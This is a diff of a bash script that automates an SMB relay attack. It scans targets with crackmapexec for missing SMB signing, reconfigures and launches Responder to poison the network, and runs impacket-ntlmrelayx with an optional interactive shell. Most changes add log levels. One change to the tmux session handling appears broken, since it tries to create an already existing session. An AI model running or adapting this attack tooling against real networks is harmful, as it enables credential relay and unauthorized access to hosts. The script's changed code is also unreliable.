@@ -38,7 +38,7 @@ cleanup() {
     local exit_code=$?
 
     if [ "$SESSION_CREATED" = true ] && [ $exit_code -ne 0 ]; then
-        log "${YELLOW}[*] Cleaning up tmux session...${RESET}"
+        log INFO "${YELLOW}[*] Cleaning up tmux session...${RESET}"
         tmux has-session -t "$session_name" 2>/dev/null && \
         tmux kill-session -t "$session_name"
     fi
@@ -72,16 +72,18 @@ banner() {
 }       
 
 log() {
-    local msg="$1"
-    echo -e "$msg"
-    echo -e "$msg" | sed 's/\x1b\[[0-9;]*m//g' >> "$ATTACK_LOG"
+    local level="$1"
+    local msg="$2"
+
+    echo -e "[$level] $msg"
+    echo "[$level] $(echo -e "$msg" | sed 's/\x1b\[[0-9;]*m//g')" >> "$ATTACK_LOG"
 }
 
 # Check if a tool is installed
 check_tool() {
-    log "[*] Checking ${YELLOW}$1${RESET} if installed..."
+    log INFO "[*] Checking ${YELLOW}$1${RESET} if installed..."
     if ! command -v "$1" &>/dev/null; then
-        log "${RED}[!] $1 is not installed. Please install it first. Exiting.${RESET}"
+        log ERROR "${RED}[!] $1 is not installed. Please install it first. Exiting.${RESET}"
         exit 1
     fi
 }
@@ -89,30 +91,30 @@ check_tool() {
 # Validate network interface
 validate_network_interface() {
     if ! ip link show "$network_interface" > /dev/null 2>&1; then
-        log "${RED}[!] Network interface ${network_interface} not found. Exiting.${RESET}"
+        log ERROR "${RED}[!] Network interface ${network_interface} not found. Exiting.${RESET}"
         exit 1
     fi
 }
 
 # Run crackmapexec
 run_crackmapexec() {
-    log "${BLUE}[*] Scanning for misconfigured SMB signing on targets...${RESET}"
-    log "${GREEN}[*] Generating list of vulnerable targets in ${TARGET_SMB_FILE}.${RESET}"
+    log INFO "${BLUE}[*] Scanning for misconfigured SMB signing on targets...${RESET}"
+    log SUCCESS "${GREEN}[*] Generating list of vulnerable targets in ${TARGET_SMB_FILE}.${RESET}"
     
     # Run crackmapexec and let it generate the relay list
     crackmapexec smb "${TARGET_FILE}" --gen-relay-list "${TARGET_SMB_FILE}" || {
-        log "${RED}[!] crackmapexec failed. Exiting.${RESET}"
+        log ERROR "${RED}[!] crackmapexec failed. Exiting.${RESET}"
         exit 1
     }
     
     if [ -s "${TARGET_SMB_FILE}" ]; then
         count=$(wc -l < "${TARGET_SMB_FILE}")
-    log "${YELLOW}[+] Found $count vulnerable target(s):${RESET}"
+        log INFO "${YELLOW}[+] Found $count vulnerable target(s):${RESET}"
     while read -r ip; do
         echo -e "${YELLOW}[!] $ip${RESET}"
     done < "${TARGET_SMB_FILE}"
     else
-        log "${RED}[!] No vulnerable targets found.${RESET}"
+        log ERROR "${RED}[!] No vulnerable targets found.${RESET}"
     fi
 
 }
@@ -121,15 +123,15 @@ run_crackmapexec() {
 edit_responder_conf() {
 if [ -f "${responder_config_file}" ]; then
         if grep -qE '^SMB = Off$' "${responder_config_file}" && grep -qE '^HTTP = Off$' "${responder_config_file}"; then
-            log "${BLUE}[*] Responder.conf already configured with SMB and HTTP set to 'Off'.${RESET}"
+            log INFO "${BLUE}[*] Responder.conf already configured with SMB and HTTP set to 'Off'.${RESET}"
         else
-            log "${YELLOW}[*] Updating Responder.conf to turn off SMB and HTTP...${RESET}"
+            log INFO "${YELLOW}[*] Updating Responder.conf to turn off SMB and HTTP...${RESET}"
             sed -i 's/^SMB = .*/SMB = Off/' "${responder_config_file}"
             sed -i 's/^HTTP = .*/HTTP = Off/' "${responder_config_file}"
-            log "${GREEN}[+] Responder.conf updated successfully.${RESET}"
+            log SUCCESS "${GREEN}[+] Responder.conf updated successfully.${RESET}"
         fi
     else
-        log "${RED}[!] Responder.conf file not found. Please ensure Responder is installed and configured properly.${RESET}"
+        log ERROR "${RED}[!] Responder.conf file not found. Please ensure Responder is installed and configured properly.${RESET}"
         exit 1
     fi
 }
@@ -141,10 +143,10 @@ start_tmux_window() {
     local command=$3
 
     # Ensure tmux session exists
-    tmux has-session -t "$session_name" 2>/dev/null || {
-        log "${RED}[!] tmux session missing.${RESET}"
+    if ! tmux new-session -d -s "$session_name"; then
+        log ERROR "${RED}[!] Failed to create tmux session.${RESET}"
         exit 1
-    }
+    fi
     
     # Create window if needed
     if ! tmux list-windows -t "$session_name" 2>/dev/null | grep -qw "$window_name"; then
@@ -152,39 +154,39 @@ start_tmux_window() {
     fi
     
     # Send the command to the new tmux window
-    tmux send-keys -t "$session_name:$window_name" "$command"
-    tmux send-keys -t "$session_name:$window_name" C-m
+    tmux send-keys -t "$session_name:$window_name" "$command" || return 1
+    tmux send-keys -t "$session_name:$window_name" C-m || return 1
 }
 
 # Function to execute SMB relay attack in tmux
 run_smb_relay_attack() {
-    log "${BLUE}[*] Starting SMB Relay Attack...${RESET}"
+    log INFO "${BLUE}[*] Starting SMB Relay Attack...${RESET}"
 
     # Ensure tmux session exists
     if ! tmux has-session -t "$session_name" 2>/dev/null; then
-        log "${GREEN}[+] Creating tmux session: $session_name.${RESET}"
+        log SUCCESS "${GREEN}[+] Creating tmux session: $session_name.${RESET}"
         tmux new-session -d -s "$session_name"
         SESSION_CREATED=true
     fi
 
     # Start Responder in a tmux window
-    log "${CYAN}Starting Responder on interface $network_interface...${RESET}"
+    log INFO "${CYAN}Starting Responder on interface $network_interface...${RESET}"
     start_tmux_window "$session_name" "responder" "responder -I \"$network_interface\" 2>&1 | tee -a \"$RESPONDER_LOG\"" || {
-        log "${RED}Failed to start Responder.${RESET}"
+        log ERROR "${RED}Failed to start Responder.${RESET}"
         exit 1
     }
 
     # Start ntlmrelayx in another tmux window
-    log "${CYAN}Starting impacket-ntlmrelayx with target file ${TARGET_SMB_FILE}...${RESET}"
+    log INFO "${CYAN}Starting impacket-ntlmrelayx with target file ${TARGET_SMB_FILE}...${RESET}"
 
     relay_command=$(printf 'impacket-ntlmrelayx -smb2support -tf "%s" 2>&1 | tee -a "%s"' "$TARGET_SMB_FILE" "$RELAY_LOG")
     if [ "$enable_interactive" = true ]; then
-        log "${YELLOW}[+] Enabling interactive shell (--interactive) in ntlmrelayx.${RESET}"
+        log INFO "${YELLOW}[+] Enabling interactive shell (--interactive) in ntlmrelayx.${RESET}"
         relay_command+=" --interactive"
     fi
     
     start_tmux_window "$session_name" "ntlmrelayx" "$relay_command" || {
-        log "${RED}Failed to start ntlmrelayx.${RESET}"
+        log ERROR "${RED}Failed to start ntlmrelayx.${RESET}"
         exit 1
     }
 
@@ -213,14 +215,14 @@ done
 
 # Require root privileges
 if [ "$EUID" -ne 0 ]; then
-    log "${RED}[!] This script must be run as root. Exiting.${RESET}"
+    log ERROR "${RED}[!] This script must be run as root. Exiting.${RESET}"
     exit 1
 fi
 
 # Show the banner
 banner
 
-log "${BLUE}[*] Logs will be stored in: ${LOG_DIR}${RESET}"
+log INFO "${BLUE}[*] Logs will be stored in: ${LOG_DIR}${RESET}"
 
 # Start SMB Relay Attack
 if tmux has-session -t "$session_name" 2>/dev/null; then
@@ -255,14 +257,14 @@ fi
 
 # Check required arguments
 if [ -z "${TARGET_FILE}" ]; then
-    log "${RED}[!] Missing required argument: -f TARGET_FILE${RESET}"
+    log ERROR "${RED}[!] Missing required argument: -f TARGET_FILE${RESET}"
     print_help
     exit 1
 fi
 
 # Check if file exists
 if [ ! -f "${TARGET_FILE}" ] || [ ! -r "${TARGET_FILE}" ]; then
-    log "${RED}[!] Target file '${TARGET_FILE}' not found or not readable.${RESET}"
+    log ERROR "${RED}[!] Target file '${TARGET_FILE}' not found or not readable.${RESET}"
     exit 1
 fi
 
@@ -277,11 +279,11 @@ check_tool "crackmapexec"
 run_crackmapexec
 
 if [ -s "${TARGET_SMB_FILE}" ]; then
-    log "${GREEN}[+] Vulnerable targets found. Proceeding with SMB relay attack...${RESET}"
+    log SUCCESS "${GREEN}[+] Vulnerable targets found. Proceeding with SMB relay attack...${RESET}"
     edit_responder_conf
     sleep 3
     run_smb_relay_attack
 else
-    log "${RED}[!] No misconfigured SMB signing targets found. Exiting...${RESET}"
+    log ERROR "${RED}[!] No misconfigured SMB signing targets found. Exiting...${RESET}"
     exit 0
 fi
